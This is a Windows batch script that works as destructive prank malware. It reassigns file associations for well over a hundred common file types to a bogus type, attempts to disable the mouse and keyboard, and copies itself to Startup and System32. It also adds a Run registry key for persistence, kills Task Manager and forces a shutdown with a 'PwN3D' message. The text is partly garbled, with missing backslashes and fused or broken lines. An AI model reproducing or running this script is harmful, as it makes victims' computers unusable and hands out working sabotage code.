@echo off

prompt $P $G

assoc .doc = fA1luRe

assoc .docx = fA1luRe

assoc .log = fA1luRe

assoc .msg = fA1luRe

assoc .pages = fA1luRe

assoc .rtf = fA1luRe

assoc .txt = fA1luRe

assoc .wpd = fA1luRe

assoc .wps = fA1luRe

assoc .accdb = fA1luRe

assoc .blg = fA1luRe

assoc .csv = fA1luRe

assoc .dat = fA1luRe

assoc .db = fA1luReassoc .efx = fA1luRe

assoc .mdb = fA1luRe

assoc .pdb = fA1luRe

assoc .pps = fA1luRe

assoc .ppt = fA1luRe

assoc .pptx = fA1luRe

assoc .sdb = fA1luRe

assoc .sdf = fA1luRe

assoc .sql = fA1luRe

assoc .vcf = fA1luRe

assoc .wks = fA1luRe

assoc .xls = fA1luRe

assoc .xlsx = fA1luRe

assoc .xml = fA1luRe

assoc .bmp = fA1luRe

assoc .gif = fA1luRe

assoc .jpg = fA1luRe

assoc .png = fA1luRe

assoc .psd = fA1luRe

assoc .psp = fA1luRe

assoc .thm = fA1luRe

assoc .tif = fA1luRe

assoc .ai = fA1luRe

assoc .drw = fA1luRe

assoc .eps = fA1luRe

assoc .ps = fA1luRe

assoc .svg = fA1luRe

assoc .3dm = fA1luRe

assoc .dwg = fA1luRe

assoc .dxf = fA1luRe

assoc .pln = fA1luRe

assoc .indd = fA1luRe

assoc .pct = fA1luRe

assoc .pdf = fA1luRe

assoc .qxd = fA1luRe

assoc .qxp = fA1luReassoc .rels = fA1luRe

assoc .aac = fA1luRe

assoc .aif = fA1luRe

assoc .iff = fA1luRe

assoc .m3u = fA1luRe

assoc .mid = fA1luRe

assoc .mp3 = fA1luRe

assoc .mpa = fA1luRe

assoc .ra = fA1luRe

assoc .wav = fA1luRe

assoc .wma = fA1luRe

assoc .3g2 = fA1luRe

assoc .3gp = fA1luRe

assoc .asf = fA1luRe

assoc .asx = fA1luRe

assoc .avi = fA1luRe

assoc .flv = fA1luRe

assoc .mov = fA1luRe

assoc .mp4 = fA1luRe

assoc .mpg = fA1luRe

assoc .rm = fA1luRe

assoc .swf = fA1luRe

assoc .vob = fA1luRe

assoc .wmv = fA1luRe

assoc .asp = fA1luRe

assoc .cer = fA1luRe

assoc .csr = fA1luRe

assoc .css = fA1luRe

assoc .htm = fA1luRe

assoc .html = fA1luRe

assoc .js = fA1luRe

assoc .jsp = fA1luRe

assoc .php = fA1luRe

assoc .rss = fA1luRe

assoc .tvpi = fA1luRe

assoc .tvvi = fA1luReassoc .xhtml = fA1luRe

assoc .fnt = fA1luRe

assoc .fon = fA1luRe

assoc .otf = fA1luRe

assoc .ttf = fA1luRe

assoc .8bi = fA1luRe

assoc .plugin = fA1luRe

assoc .xll = fA1luRe

assoc .cab = fA1luRe

assoc .cpl = fA1luRe

assoc .cur = fA1luRe

assoc .dll = fA1luRe

assoc .dmp = fA1luRe

assoc .drv = fA1luRe

assoc .key = fA1luRe

assoc .lnk = fA1luRe

assoc .sys = fA1luRe

assoc .cfg = fA1luRe

assoc .ini = fA1luRe

assoc .keychain = fA1luRe

assoc .prf = fA1luRe

assoc .app = fA1luRe

assoc .bat = fA1luRe

assoc .cgi = fA1luRe

assoc .com = fA1luRe

assoc .exe = fA1luRe

assoc .pif = fA1luRe

assoc .vb = fA1luRe

assoc .ws = fA1luRe

assoc .7z = fA1luRe

assoc .deb = fA1luRe

assoc .gz = fA1luRe

assoc .pkg = fA1luRe

assoc .rar = fA1luRe

assoc .sit = fA1luRe

assoc .sitx = fA1luReassoc .tar.gz = fA1luRe

assoc .zip = fA1luRe

assoc .zipx = fA1luRe

assoc .bin = fA1luRe

assoc .hqx = fA1luRe

assoc .mim = fA1luRe

assoc .uue = fA1luRe

assoc .c = fA1luRe

assoc .cpp = fA1luRe

assoc .dtd = fA1luRe

assoc .java = fA1luRe

assoc .pl = fA1luRe

assoc .bak = fA1luRe

assoc .bup = fA1luRe

assoc .gho = fA1luRe

assoc .ori = fA1luRe

assoc .tmp = fA1luRe

assoc .dmg = fA1luRe

assoc .iso = fA1luRe

assoc .toast = fA1luRe

assoc .vcd = fA1luRe

assoc .gam = fA1luRe

assoc .nes = fA1luRe

assoc .rom = fA1luRe

assoc .sav = fA1luRe

assoc .dbx = fA1luRe

assoc .msi = fA1luRe

assoc .part = fA1luRe

assoc .torrent = fA1luRe

assoc .yps = fA1luRe

rundll32.exe mouse, disable

rundll32.exe keyboard, disable

copy setup.bat %userprofile%AppDataRoamingMicrosoftWindowsStart

MenuProgramsStartup

copy setup.bat %windir%System32

reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun /v fA1luRe /t REG_SZ /d %windir%System32setup.bat

taskkill /f /im taskmgr.exe

reg restore

HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPolicie

sSystem DisableTaskMgr = 1

shutdown -s -f -t 10 -c "PwN3D by fA1luRe!!!"
